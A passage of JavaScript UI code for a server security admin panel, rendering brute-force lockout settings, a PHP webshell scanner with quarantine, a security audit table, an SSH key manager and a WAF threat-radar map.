        return `
            <div class="suite-pane-main">
                <div style="display:grid; grid-template-columns:1fr 2fr; gap:1.25rem;">
                    <!-- Configuration Info -->
                    <div>
                        <div style="background:rgba(15,23,42,0.6); padding:1rem; border-radius:var(--radius-md); border:1px solid var(--glass-border);">
                            <h4 style="margin:0 0 0.75rem 0; font-size:0.95rem; color:var(--text-bright);">Lockout Policy Thresholds</h4>
                            <div style="display:flex; flex-direction:column; gap:0.6rem; font-size:0.8rem; color:var(--text-dim);">
                                <div style="display:flex; justify-content:space-between;">
                                    <span>Max Failed Attempts:</span>
                                    <strong style="color:var(--text-bright);">${bf.max_attempts || 5} attempts</strong>
                                </div>
                                <div style="display:flex; justify-content:space-between;">
                                    <span>Decay Window:</span>
                                    <strong style="color:var(--text-bright);">${Math.round((bf.decay_seconds || 900) / 60)} minutes</strong>
                                </div>
                                <div style="display:flex; justify-content:space-between;">
                                    <span>Lockout Duration:</span>
                                    <strong style="color:var(--text-bright);">${Math.round((bf.lockout_duration || 3600) / 60)} minutes</strong>
                                </div>
                                <div style="display:flex; justify-content:space-between;">
                                    <span>Firewall Auto-Escalate:</span>
                                    <strong style="color:#34d399;">Enabled (3rd Strike)</strong>
                                </div>
                            </div>
                        </div>

                        <h4 style="margin:1.25rem 0 0.5rem 0; font-size:0.95rem; color:var(--text-bright);">Active Lockouts (${lockouts.length})</h4>
                        <div style="display:flex; flex-direction:column; gap:0.5rem;">
                            ${lockoutCards}
                        </div>
                    </div>

                    <!-- Auth Audit Log -->
                    <div>
                        <h4 style="margin:0 0 0.5rem 0; font-size:0.95rem; color:var(--text-bright);">Authentication Event Audit Log</h4>
                        <div class="suite-table-wrapper">
                            <table class="suite-table">
                                <thead>
                                    <tr>
                                        <th>IP Address</th>
                                        <th>Target Username</th>
                                        <th>Status</th>
                                        <th>Timestamp</th>
                                    </tr>
                                </thead>
                                <tbody>${historyRows}</tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    renderMalwareTab() {
        const scan = this.state.scanResults;
        const quar = this.state.quarantine || [];

        const quarCards = quar.map(q => `
            <tr>
                <td style="font-family:monospace; font-size:0.8rem; color:var(--text-bright);">${this.escapeHtml(q.id)}</td>
                <td style="font-size:0.8rem; max-width:250px; overflow:hidden; text-overflow:ellipsis;" title="${this.escapeHtml(q.original_path)}">${this.escapeHtml(q.original_path)}</td>
                <td style="font-size:0.75rem; color:var(--text-dim);">${this.escapeHtml(q.quarantined_at)}</td>
                <td>
                    <div style="display:flex; gap:0.4rem;">
                        <button class="btn ghost-btn btn-sm" onclick="window.shieldViewInstance.restoreQuarantine('${this.escapeHtml(q.id)}')">Restore</button>
                        <button class="btn danger-btn btn-sm" onclick="window.shieldViewInstance.deleteQuarantine('${this.escapeHtml(q.id)}')">Delete</button>
                    </div>
                </td>
            </tr>
        `).join('') || '<tr><td colspan="4" style="text-align:center; color:var(--text-dim); padding:1rem;">Quarantine vault is empty.</td></tr>';

        return `
            <div class="suite-pane-main">
                <div class="suite-toolbar" style="margin-bottom:1rem;">
                    <div>
                        <h3 style="margin:0; font-size:1.1rem; color:var(--text-bright);">Heuristic Malware & Webshell Static Analyzer</h3>
                        <p style="margin:0.25rem 0 0 0; font-size:0.8rem; color:var(--text-dim);">
                            Scans application PHP files for obfuscated code execution, known webshell signatures (c99, r57, b374k), and rogue upload backdoors.
                        </p>
                    </div>
                    <div style="display:flex; gap:0.5rem;">
                        <button class="btn primary-btn shine-effect" onclick="window.shieldViewInstance.runMalwareScan(false)" ${this.state.scanning ? 'disabled' : ''}>
                            ${this.state.scanning ? 'Scanning...' : '🔍 Scan Codebase'}
                        </button>
                        <button class="btn danger-btn" onclick="window.shieldViewInstance.runMalwareScan(true)" ${this.state.scanning ? 'disabled' : ''}>
                            ⚡ Scan & Quarantine
                        </button>
                    </div>
                </div>

                <!-- Scan Results Display -->
                ${scan ? `
                    <div style="background:rgba(0,0,0,0.3); border:1px solid var(--glass-border); border-radius:var(--radius-md); padding:1rem; margin-bottom:1.5rem;">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <strong style="color:var(--text-bright); font-size:0.95rem;">Scan Report: ${scan.infected_count === 0 ? '✅ Clean' : '⚠️ ' + scan.infected_count + ' Threat(s) Found'}</strong>
                            <span style="font-size:0.75rem; color:var(--text-dim);">${scan.total_files_scanned} files inspected</span>
                        </div>
                        ${scan.infected_files && scan.infected_files.length > 0 ? `
                            <div style="margin-top:0.75rem; display:flex; flex-direction:column; gap:0.5rem;">
                                ${scan.infected_files.map(f => `
                                    <div style="background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.3); padding:0.6rem 0.85rem; border-radius:var(--radius-sm); font-size:0.8rem;">
                                        <strong style="color:#f87171;">${this.escapeHtml(f.file)}</strong>
                                        <div style="margin-top:0.3rem;">
                                            ${f.threats.map(t => `<div style="color:var(--text-dim);">&bull; Line ${t.line}: <span style="color:#f59e0b;">${this.escapeHtml(t.description)}</span></div>`).join('')}
                                        </div>
                                    </div>
                                `).join('')}
                            </div>
                        ` : ''}
                    </div>
                ` : ''}

                <!-- Quarantine Vault -->
                <h4 style="margin:1rem 0 0.5rem 0; font-size:1rem; color:var(--text-bright);">Isolated Quarantine Vault (${quar.length})</h4>
                <div class="suite-table-wrapper">
                    <table class="suite-table">
                        <thead>
                            <tr>
                                <th>Quarantine ID</th>
                                <th>Original Path</th>
                                <th>Quarantined At</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>${quarCards}</tbody>
                    </table>
                </div>
            </div>
        `;
    }

    renderAdvisorTab() {
        const audit = this.state.auditResults;
        if (this.state.auditing) {
            return `<div class="suite-pane-main" style="text-align:center; padding:3rem; color:var(--text-dim);">⏳ Executing 25-point comprehensive security audit...</div>`;
        }

        if (!audit) {
            return `
                <div class="suite-pane-main" style="text-align:center; padding:3rem;">
                    <button class="btn primary-btn shine-effect" onclick="window.shieldViewInstance.runAudit()">Execute 25-Point Security Audit</button>
                </div>
            `;
        }

        const checks = (audit.checks || []).filter(c => {
            if (this.state.advisorFilter === 'all') return true;
            return c.status === this.state.advisorFilter;
        });

        const rows = checks.map(c => {
            const badge = c.status === 'passed' 
                ? '<span class="suite-pill suite-pill-success">✓ Passed</span>'
                : (c.status === 'warning' ? '<span class="suite-pill suite-pill-warning">⚠ Warning</span>' : '<span class="suite-pill suite-pill-danger">✗ Critical</span>');

            return `
                <tr>
                    <td style="font-weight:700; color:var(--text-bright);">${this.escapeHtml(c.name)}</td>
                    <td><span class="suite-pill suite-pill-neutral" style="font-size:0.7rem;">${this.escapeHtml(c.category || 'System')}</span></td>
                    <td>${badge}</td>
                    <td style="font-family:monospace; font-size:0.8rem; color:var(--text-dim);">${this.escapeHtml(c.current || '')}</td>
                    <td style="font-size:0.8rem; max-width:280px;">
                        <div>${this.escapeHtml(c.description)}</div>
                        ${c.status !== 'passed' ? `<div style="color:#38bdf8; font-weight:600; margin-top:0.25rem;">&rarr; ${this.escapeHtml(c.recommendation)}</div>` : ''}
                    </td>
                </tr>
            `;
        }).join('');

        return `
            <div class="suite-pane-main">
                <div class="suite-toolbar" style="margin-bottom:1rem; flex-wrap:wrap; gap:1rem;">
                    <div>
                        <h3 style="margin:0; font-size:1.1rem; color:var(--text-bright);">25-Point Automated Security Advisor</h3>
                        <p style="margin:0.25rem 0 0 0; font-size:0.8rem; color:var(--text-dim);">
                            Audited on ${this.escapeHtml(audit.audit_date)} &bull; Passed: <strong>${audit.passed_count}</strong> &bull; Warnings: <strong>${audit.warning_count}</strong> &bull; Critical: <strong>${audit.critical_count}</strong>
                        </p>
                    </div>
                    <div style="display:flex; gap:0.5rem;">
                        <button class="btn ${this.state.advisorFilter === 'all' ? 'primary-btn' : 'ghost-btn'} btn-sm" onclick="window.shieldViewInstance.setState({advisorFilter:'all'}); window.shieldViewInstance.update();">All (25)</button>
                        <button class="btn ${this.state.advisorFilter === 'critical' ? 'danger-btn' : 'ghost-btn'} btn-sm" onclick="window.shieldViewInstance.setState({advisorFilter:'critical'}); window.shieldViewInstance.update();">Critical (${audit.critical_count})</button>
                        <button class="btn ${this.state.advisorFilter === 'warning' ? 'primary-btn' : 'ghost-btn'} btn-sm" onclick="window.shieldViewInstance.setState({advisorFilter:'warning'}); window.shieldViewInstance.update();">Warnings (${audit.warning_count})</button>
                        <button class="btn ${this.state.advisorFilter === 'passed' ? 'primary-btn' : 'ghost-btn'} btn-sm" onclick="window.shieldViewInstance.setState({advisorFilter:'passed'}); window.shieldViewInstance.update();">Passed (${audit.passed_count})</button>
                    </div>
                </div>

                <div class="suite-table-wrapper">
                    <table class="suite-table">
                        <thead>
                            <tr>
                                <th>Security Control</th>
                                <th>Category</th>
                                <th>Status</th>
                                <th>Current Setting</th>
                                <th>Finding & Remediation</th>
                            </tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                </div>
            </div>
        `;
    }

    renderSshTab() {
        const keys = this.state.sshKeys || [];

        const keyCards = keys.map(k => `
            <tr>
                <td><strong style="color:var(--text-bright);">${this.escapeHtml(k.comment)}</strong></td>
                <td><span class="suite-pill suite-pill-info" style="font-size:0.75rem;">${this.escapeHtml(k.type)}</span></td>
                <td style="font-family:monospace; font-size:0.8rem; color:var(--text-dim);">${this.escapeHtml(k.fingerprint)}</td>
                <td style="font-family:monospace; font-size:0.75rem; color:var(--text-dim);">${this.escapeHtml(k.key_preview)}</td>
                <td>
                    <button class="btn danger-btn btn-sm" onclick="window.shieldViewInstance.removeSshKey('${this.escapeHtml(k.fingerprint)}')">Revoke</button>
                </td>
            </tr>
        `).join('') || '<tr><td colspan="5" style="text-align:center; color:var(--text-dim); padding:1.5rem;">No authorized SSH public keys found.</td></tr>';

        return `
            <div class="suite-pane-main">
                <div class="suite-toolbar" style="margin-bottom:1rem;">
                    <div>
                        <h3 style="margin:0; font-size:1.1rem; color:var(--text-bright);">SSH Authorized Keys Manager</h3>
                        <p style="margin:0.25rem 0 0 0; font-size:0.8rem; color:var(--text-dim);">
                            Inspect, add, and revoke public keys permitted for SSH shell authentication into the host system.
                        </p>
                    </div>
                    <div style="display:flex; gap:0.5rem;">
                        <button class="btn ghost-btn btn-sm" onclick="window.shieldViewInstance.openGenerateSshModal()">⚡ Generate ED25519 Keypair</button>
                        <button class="btn primary-btn btn-sm" onclick="window.shieldViewInstance.openAddSshModal()">+ Import Public Key</button>
                    </div>
                </div>

                <div class="suite-table-wrapper">
                    <table class="suite-table">
                        <thead>
                            <tr>
                                <th>Key Comment / Identity</th>
                                <th>Type</th>
                                <th>SHA256 Fingerprint</th>
                                <th>Key Preview</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody>${keyCards}</tbody>
                    </table>
                </div>
            </div>
        `;
    }

    async runAudit() {
        this.setState({ auditing: true });
        this.update();
        try {
            const res = await this.admin.api('shield_audit_run');
            const data = (res.success && res.data?.audit) ? res.data.audit : (res.audit || res);
            this.setState({ auditResults: data, auditing: false });
        } catch (e) {
            this.admin.notify("Audit error: " + e.message, "error");
            this.setState({ auditing: false });
        }
        this.update();
    }

    async runMalwareScan(quarantine = false) {
        this.setState({ scanning: true });
        this.update();
        try {
            const res = await this.admin.api('shield_scan_run', { quarantine: quarantine });
            const data = (res.success && res.data) ? res.data : res;
            this.setState({ scanResults: data, scanning: false });
            if (quarantine && data.quarantined && data.quarantined.length > 0) {
                this.admin.notify(`Isolated ${data.quarantined.length} malicious file(s) into quarantine.`, "success");
                await this.fetchData();
            } else if (data.infected_count === 0) {
                this.admin.notify("Scan complete: No malware detected!", "success");
            } else {
                this.admin.notify(`Scan finished: ${data.infected_count} threats detected!`, "warning");
            }
        } catch (e) {
            this.admin.notify("Scan error: " + e.message, "error");
            this.setState({ scanning: false });
        }
        this.update();
    }

    openBlockModal() {
        const modal = document.getElementById('modal-container');
        document.getElementById('modal-title').textContent = 'Block IP Address (Firewall)';
        document.getElementById('modal-body').innerHTML = `
            <div style="display:flex; flex-direction:column; gap:1rem;">
                <div class="input-group">
                    <label>IP Address (IPv4 or IPv6) <span style="color:var(--danger)">*</span></label>
                    <input type="text" id="fw-block-ip" placeholder="e.g. 198.51.100.4" required>
                </div>
                <div class="input-group">
                    <label>Ban Reason</label>
                    <input type="text" id="fw-block-reason" placeholder="e.g. Malicious port scan or repeated auth failures">
                </div>
                <div class="input-group">
                    <label>Duration</label>
                    <select id="fw-block-duration" style="width:100%; padding:0.6rem; background:var(--input-bg); border:1px solid var(--glass-border); color:var(--text-bright); border-radius:var(--radius-sm);">
                        <option value="3600">1 Hour</option>
                        <option value="86400" selected>24 Hours (1 Day)</option>
                        <option value="604800">7 Days</option>
                        <option value="2592000">30 Days</option>
                        <option value="0">Permanent</option>
                    </select>
                </div>
            </div>
        `;
        const saveBtn = document.getElementById('modal-save');
        saveBtn.textContent = 'Enforce Block';
        saveBtn.onclick = async () => {
            const ip = document.getElementById('fw-block-ip').value.trim();
            const reason = document.getElementById('fw-block-reason').value.trim();
            const duration = parseInt(document.getElementById('fw-block-duration').value, 10);

            if (!ip) {
                this.admin.notify("IP address is required.", "error");
                return;
            }

            try {
                const res = await this.admin.api('shield_firewall_block', { ip, reason, duration: duration > 0 ? duration : null });
                if (res.success) {
                    this.admin.notify(res.message || "IP blocked successfully.", "success");
                    modal.classList.remove('active');
                    await this.fetchData();
                    this.update();
                } else {
                    this.admin.notify(res.error || "Failed to block IP.", "error");
                }
            } catch (e) {
                this.admin.notify("Error: " + e.message, "error");
            }
        };
        modal.classList.add('active');
    }

    openWhitelistModal() {
        const modal = document.getElementById('modal-container');
        document.getElementById('modal-title').textContent = 'Whitelist IP Address';
        document.getElementById('modal-body').innerHTML = `
            <div style="display:flex; flex-direction:column; gap:1rem;">
                <div class="input-group">
                    <label>IP Address <span style="color:var(--danger)">*</span></label>
                    <input type="text" id="fw-wl-ip" placeholder="e.g. 203.0.113.50" required>
                </div>
                <div class="input-group">
                    <label>Note / Description</label>
                    <input type="text" id="fw-wl-note" placeholder="e.g. Office Static IP">
                </div>
            </div>
        `;
        const saveBtn = document.getElementById('modal-save');
        saveBtn.textContent = 'Add to Whitelist';
        saveBtn.onclick = async () => {
            const ip = document.getElementById('fw-wl-ip').value.trim();
            const note = document.getElementById('fw-wl-note').value.trim();

            if (!ip) return;

            try {
                const res = await this.admin.api('shield_whitelist_add', { ip, note });
                if (res.success) {
                    this.admin.notify(res.message || "IP added to whitelist.", "success");
                    modal.classList.remove('active');
                    await this.fetchData();
                    this.update();
                } else {
                    this.admin.notify(res.error || "Failed to whitelist IP.", "error");
                }
            } catch (e) {
                this.admin.notify("Error: " + e.message, "error");
            }
        };
        modal.classList.add('active');
    }

    async unblockIp(ip) {
        if (!confirm(`Unblock IP '${ip}'?`)) return;
        try {
            const res = await this.admin.api('shield_firewall_unblock', { ip });
            if (res.success) {
                this.admin.notify(`IP '${ip}' unblocked.`, "success");
                await this.fetchData();
                this.update();
            } else {
                this.admin.notify(res.error || "Failed to unblock.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    async removeWhitelist(ip) {
        if (!confirm(`Remove '${ip}' from whitelist?`)) return;
        try {
            const res = await this.admin.api('shield_whitelist_remove', { ip });
            if (res.success) {
                this.admin.notify(`IP '${ip}' removed from whitelist.`, "success");
                await this.fetchData();
                this.update();
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    async clearLockout(ip) {
        try {
            const res = await this.admin.api('shield_bruteforce_clear', { ip });
            if (res.success) {
                this.admin.notify(`Lockout cleared for ${ip}.`, "success");
                await this.fetchData();
                this.update();
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    async restoreQuarantine(id) {
        try {
            const res = await this.admin.api('shield_quarantine_restore', { id });
            if (res.success) {
                this.admin.notify(res.message || "File restored.", "success");
                await this.fetchData();
                this.update();
            } else {
                this.admin.notify(res.error || "Restore failed.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    async deleteQuarantine(id) {
        if (!confirm("Permanently delete quarantined file? This cannot be undone.")) return;
        try {
            const res = await this.admin.api('shield_quarantine_delete', { id });
            if (res.success) {
                this.admin.notify("Quarantined file deleted permanently.", "success");
                await this.fetchData();
                this.update();
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    openAddSshModal() {
        const modal = document.getElementById('modal-container');
        document.getElementById('modal-title').textContent = 'Register Authorized SSH Key';
        document.getElementById('modal-body').innerHTML = `
            <div style="display:flex; flex-direction:column; gap:1rem;">
                <div class="input-group">
                    <label>Public Key (ssh-rsa, ssh-ed25519) <span style="color:var(--danger)">*</span></label>
                    <textarea id="ssh-key-val" rows="4" style="width:100%; font-family:monospace; font-size:0.8rem; background:var(--input-bg); border:1px solid var(--glass-border); color:var(--text-bright); border-radius:var(--radius-sm);" placeholder="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5... user@host"></textarea>
                </div>
                <div class="input-group">
                    <label>Comment / Identifier</label>
                    <input type="text" id="ssh-key-comment" placeholder="e.g. dev-laptop">
                </div>
            </div>
        `;
        const saveBtn = document.getElementById('modal-save');
        saveBtn.textContent = 'Save Public Key';
        saveBtn.onclick = async () => {
            const key = document.getElementById('ssh-key-val').value.trim();
            const comment = document.getElementById('ssh-key-comment').value.trim();
            if (!key) return;

            try {
                const res = await this.admin.api('shield_ssh_keys_add', { key, comment });
                if (res.success) {
                    this.admin.notify(res.message || "Key registered.", "success");
                    modal.classList.remove('active');
                    await this.fetchData();
                    this.update();
                } else {
                    this.admin.notify(res.error || "Failed to register key.", "error");
                }
            } catch (e) {
                this.admin.notify("Error: " + e.message, "error");
            }
        };
        modal.classList.add('active');
    }

    openGenerateSshModal() {
        const modal = document.getElementById('modal-container');
        document.getElementById('modal-title').textContent = 'Generate New SSH Keypair';
        document.getElementById('modal-body').innerHTML = `
            <div style="display:flex; flex-direction:column; gap:1rem;">
                <p style="font-size:0.85rem; color:var(--text-dim); margin:0;">
                    Generates a modern ED25519 elliptic-curve keypair. The public key will be automatically added to authorized_keys.
                </p>
                <div class="input-group">
                    <label>Key Comment</label>
                    <input type="text" id="gen-ssh-comment" value="spp-admin-auto" placeholder="e.g. spp-admin-auto">
                </div>
            </div>
        `;
        const saveBtn = document.getElementById('modal-save');
        saveBtn.textContent = 'Generate Keypair';
        saveBtn.onclick = async () => {
            const comment = document.getElementById('gen-ssh-comment').value.trim();
            saveBtn.disabled = true;
            saveBtn.textContent = 'Generating...';

            try {
                const res = await this.admin.api('shield_ssh_keys_generate', { comment, type: 'ed25519' });
                const data = (res.success && res.data) ? res.data : res;
                if (data.success) {
                    document.getElementById('modal-body').innerHTML = `
                        <div style="display:flex; flex-direction:column; gap:1rem;">
                            <div style="color:#34d399; font-weight:700;">✅ Keypair generated and public key registered!</div>
                            <div class="input-group">
                                <label>Your Private Key (SAVE THIS SECURELY NOW):</label>
                                <textarea id="gen-priv-key" rows="6" style="width:100%; font-family:monospace; font-size:0.75rem; background:rgba(0,0,0,0.4); border:1px solid var(--glass-border); color:#38bdf8;" readonly>${this.escapeHtml(data.private_key)}</textarea>
                                <button class="btn ghost-btn btn-sm" style="margin-top:0.3rem;" onclick="navigator.clipboard.writeText(document.getElementById('gen-priv-key').value); window.shieldViewInstance.admin.notify('Private key copied!', 'success');">📋 Copy Private Key</button>
                            </div>
                        </div>
                    `;
                    saveBtn.textContent = 'Done';
                    saveBtn.onclick = () => {
                        modal.classList.remove('active');
                        this.fetchData();
                        this.update();
                    };
                } else {
                    this.admin.notify(data.error || "Generation failed.", "error");
                    saveBtn.disabled = false;
                    saveBtn.textContent = 'Generate Keypair';
                }
            } catch (e) {
                this.admin.notify("Error: " + e.message, "error");
                saveBtn.disabled = false;
                saveBtn.textContent = 'Generate Keypair';
            }
        };
        modal.classList.add('active');
    }

    async removeSshKey(fingerprint) {
        if (!confirm(`Revoke SSH key with fingerprint '${fingerprint}'?`)) return;
        try {
            const res = await this.admin.api('shield_ssh_keys_remove', { fingerprint });
            if (res.success) {
                this.admin.notify("SSH key revoked.", "success");
                await this.fetchData();
                this.update();
            } else {
                this.admin.notify(res.error || "Revocation failed.", "error");
            }
        } catch (e) {
            this.admin.notify("Error: " + e.message, "error");
        }
    }

    renderThreatRadarTab() {
        if (this.state.loadingWaf && (!this.state.wafRules || this.state.wafRules.length === 0)) {
            return `
                <div class="suite-pane-main" style="padding:3rem; text-align:center;">
                    <div style="font-size:2rem; margin-bottom:1rem;">🌐</div>
                    <h3 style="color:var(--text-bright);">Loading Live Threat Radar & WAF Rules...</h3>
                    <p style="color:var(--text-dim); font-size:0.85rem;">Connecting to in-memory Virtual Patching and GeoIP telemetry...</p>
                </div>
            `;
        }

        const rules = this.state.wafRules || [];
        const radar = this.state.threatRadarFeed || { feed: [], attack_points: [], top_countries: [], total_intercepted: 0, total_auto_banned: 0 };
        const feed = (radar.feed && radar.feed.length > 0) ? radar.feed : (this.state.wafThreatLogs || []);
        const attackPoints = radar.attack_points || [];
        const res = this.state.wafInspectResult;

        const totalIntercepted = radar.total_intercepted || feed.length;
        const totalAutoBanned = radar.total_auto_banned || 0;
        const activeRulesCount = rules.filter(r => r.enabled).length;

        // Render SVG Trajectory Beams and Origin Beacons
        const serverX = 575.5;
        const serverY = 154.2;

        const trajectoryBeams = attackPoints.map(pt => {
            const midX = (pt.x + serverX) / 2;
            const midY = Math.min(pt.y, serverY) - 35;
            return `
                <path d="M ${pt.x},${pt.y} Q ${midX},${midY} ${serverX},${serverY}"
                      fill="none" stroke="url(#radarLaserGrad)" stroke-width="1.8"
                      stroke-dasharray="6,4" class="attack-laser" opacity="0.85"/>
            `;
        }).join('');

        const originMarkers = attackPoints.map(pt => {
            return `
                <g class="radar-origin-group" style="cursor:pointer;">
                    <title>${pt.flag} ${this.escapeHtml(pt.country)}: ${pt.count} attack(s) from ${this.escapeHtml(pt.latest_ip)} (${this.escapeHtml(pt.category)})</title>
                    <circle cx="${pt.x}" cy="${pt.y}" r="12" fill="none" stroke="#ef4444" stroke-width="1" class="radar-pulse-ring"/>
                    <circle cx="${pt.x}" cy="${pt.y}" r="5" fill="#ef4444" opacity="0.9"/>
                    <circle cx="${pt.x}" cy="${pt.y}" r="2" fill="#ffffff"/>
                    <text x="${pt.x}" y="${pt.y - 8}" font-size="9" fill="#f87171" font-weight="700" text-anchor="middle">
                        ${pt.flag} ${pt.count}
                    </text>
                </g>
            `;
        }).join('');

        const topCountryChips = (radar.top_countries || []).map(c => `
            <span class="suite-pill suite-pill-neutral" style="font-size:0.75rem; display:inline-flex; align-items:center; gap:0.3rem;">
                <strong>${this.escapeHtml(c.country)}</strong>: <span style="color:#f87171; font-weight:700;">${c.count}</span>
            </span>
        `).join('') || '<span style="color:var(--text-dim); font-size:0.75rem;">No active external origins recorded.</span>';

        const threatRows = feed.map(l => {
            const geo = l.geo || { flag: '🌐', country: 'Global Anycast', code: 'GL' };
            const strikes = l.strikes || 1;
            const isAutoBanned = l.status === 'auto_banned' || strikes >= 3;
            const sevColor = (l.severity === 'critical') ? '#f87171' : ((l.severity === 'high') ? '#f59e0b' : '#38bdf8');
            const targetVal = l.target || l.target_uri || l.uri || '/';

            return `
                <tr>
                    <td style="font-size:0.75rem; color:var(--text-dim); white-space:nowrap;">${this.escapeHtml(l.timestamp || '')}</td>
                    <td>
                        <span class="suite-pill" style="background:${sevColor}22; color:${sevColor}; border:1px solid ${sevColor}44; font-size:0.7rem; font-weight:700;">
                            ${this.escapeHtml((l.category || 'EXPLOIT').toUpperCase())}
                        </span>
                    </td>
                    <td style="font-size:0.8rem; color:var(--text-bright); white-space:nowrap;">
                        <span style="font-size:1rem; margin-right:4px;">${geo.flag || '🌐'}</span>
                        <code style="font-family:monospace; color:#38bdf8;">${this.escapeHtml(l.ip || l.client_ip || 'Unknown')}</code>
                        <div style="font-size:0.65rem; color:var(--text-dim);">${this.escapeHtml(geo.country_name || geo.country || 'Anycast')}</div>
                    </td>
                    <td style="font-size:0.75rem; color:var(--text-dim); max-width:140px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${this.escapeHtml(targetVal)}">
                        ${this.escapeHtml(targetVal)}
                    </td>
                    <td>
                        <span class="suite-pill ${isAutoBanned ? 'suite-pill-danger' : (strikes > 1 ? 'suite-pill-warning' : 'suite-pill-neutral')}" style="font-size:0.7rem;">
                            ${isAutoBanned ? '🚫 Auto-Banned' : `⚠️ Strike ${strikes}/3`}
                        </span>
                    </td>
                    <td style="text-align:right; white-space:nowrap;">
                        <button onclick="window.shieldViewInstance.progressiveAutoBan('${this.escapeHtml(l.ip || l.client_ip || '')}')" class="btn danger-btn btn-sm" style="padding:2px 7px; font-size:0.68rem;" title="Enforce Progressive Ban on Host Firewall">
                            ⚡ Ban
                        </button>
                        ${targetVal && targetVal !== '/' ? `
                            <button onclick="window.shieldViewInstance.autoQuarantineTarget('${this.escapeHtml(targetVal)}')" class="btn secondary-btn btn-sm" style="padding:2px 7px; font-size:0.68rem; margin-left:3px;" title="Quarantine Attacked Target File">
                                🛡️
                            </button>
                        ` : ''}
                    </td>
                </tr>
            `;
        }).join('') || `<tr><td colspan="6" style="text-align:center; padding:2rem; color:var(--text-dim);">No active threats intercepted in recent window. All systems nominal.</td></tr>`;

        const ruleCards = rules.map(r => `
            <div style="background:rgba(0,0,0,0.25); border:1px solid var(--glass-border); border-left:3px solid ${r.enabled ? '#34d399' : '#64748b'}; padding:0.9rem; border-radius:var(--radius-sm); display:flex; justify-content:space-between; align-items:center; gap:1rem;">
                <div style="overflow:hidden;">
                    <div style="display:flex; align-items:center; gap:0.6rem; margin-bottom:4px;">
                        <strong style="color:var(--text-bright); font-size:0.9rem;">${this.escapeHtml(r.name)}</strong>
                        <span class="suite-pill ${r.severity === 'critical' ? 'suite-pill-danger' : 'suite-pill-warning'}" style="font-size:0.65rem;">
                            ${this.escapeHtml(r.severity.toUpperCase())}
                        </span>
                    </div>
                    <div style="font-size:0.75rem; color:var(--text-dim); margin-bottom:4px;">${this.escapeHtml(r.description)}</div>
                    <code style="font-size:0.7rem; color:#38bdf8; background:rgba(0,0,0,0.4); padding:2px 6px; border-radius:4px; font-family:monospace;">${this.escapeHtml(r.pattern)}</code>
                </div>
                <div style="flex-shrink:0;">
                    <label style="position:relative; display:inline-block; width:44px; height:24px; cursor:pointer;">
                        <input type="checkbox" ${r.enabled ? 'checked' : ''} onchange="window.shieldViewInstance.toggleWafPatch('${this.escapeHtml(r.id)}', this.checked)" style="opacity:0; width:0; height:0;">
                        <span style="position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background:${r.enabled ? '#10b981' : '#334155'}; border-radius:24px; transition:0.3s;">
                            <span style="position:absolute; content:''; height:18px; width:18px; left:${r.enabled ? '22px' : '3px'}; bottom:3px; background:white; border-radius:50%; transition:0.3s;"></span>
                        </span>
                    </label>
                </div>
            </div>
        `).join('');

        return `
            <div style="display:flex; flex-direction:column; gap:1.25rem;">
                <style>
                    @keyframes radarPing {
                        0% { r: 5px; opacity: 1; stroke-width: 1.5px; }
                        100% { r: 24px; opacity: 0; stroke-width: 0.2px; }
                    }
                    .radar-pulse-ring {
                        animation: radarPing 2.2s cubic-bezier(0.1, 0.8, 0.2, 1) infinite;
                    }
                    @keyframes laserDash {
                        to { stroke-dashoffset: -20; }
                    }
                    .attack-laser {
                        animation: laserDash 1.2s linear infinite;
                    }
                </style>

                <!-- Threat Radar Metrics Ribbon -->
                <div style="display:grid; grid-template-columns:repeat(4, 1fr); gap:1rem;">
                    <div class="suite-stat-card" style="border-left:4px solid #10b981;">
                        <div class="suite-stat-icon" style="background:rgba(16,185,129,0.1); color:#34d399;">⚡</div>
                        <div>
                            <div class="suite-stat-value" style="color:#34d399;">Active WAF</div>
                            <div class="suite-stat-label">Virtual Patching Status</div>
                        </div>
                    </div>
                    <div class="suite-stat-card">
                        <div class="suite-stat-icon" style="background:rgba(56,189,248,0.1); color:#38bdf8;">🛡️</div>
                        <div>
                            <div class="suite-stat-value">${activeRulesCount} / ${rules.length}</div>
                            <div class="suite-stat-label">Active Virtual Patches</div>
                        </div>
                    </div>
                    <div class="suite-stat-card">
                        <div class="suite-stat-icon" style="background:rgba(239,68,68,0.1); color:#f87171;">🚫</div>
                        <div>
                            <div class="suite-stat-value">${totalIntercepted}</div>
                            <div class="suite-stat-label">Intercepted Threats</div>
                        </div>
                    </div>
                    <div class="suite-stat-card" style="border-left:4px solid #f59e0b;">
                        <div class="suite-stat-icon" style="background:rgba(245,158,11,0.1); color:#fbbf24;">⚡</div>
                        <div>
                            <div class="suite-stat-value" style="color:#fbbf24;">${totalAutoBanned} Auto-Bans</div>
                            <div class="suite-stat-label">Progressive Strike Filter</div>
                        </div>
                    </div>
                </div>

                <!-- Interactive SVG World Map Threat Radar -->
                <div class="suite-pane-main" style="padding:1.25rem; background:#070b12; border:1px solid #1e293b; border-radius:12px; position:relative; overflow:hidden;">
                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.75rem; flex-wrap:wrap; gap:0.5rem;">
                        <div>
                            <h3 style="margin:0; font-size:1.1rem; color:var(--text-bright); display:flex; align-items:center; gap:0.5rem;">
                                <span>🌐</span> Sovereign Threat Radar — Live Planetary Interception Map
                                <span class="suite-pill suite-pill-danger" style="font-size:0.65rem; animation:pulse 2s infinite;">● LIVE STREAMING</span>
                            </h3>
                            <div style="font-size:0.75rem; color:var(--text-dim); margin-top:2px;">
                                Equirectangular projection mapping attacks intercepted by AST WAF directly to physical geographic coordinates.
                            </div>
                        </div>
                        <div style="display:flex; align-items:center; gap:0.5rem;">
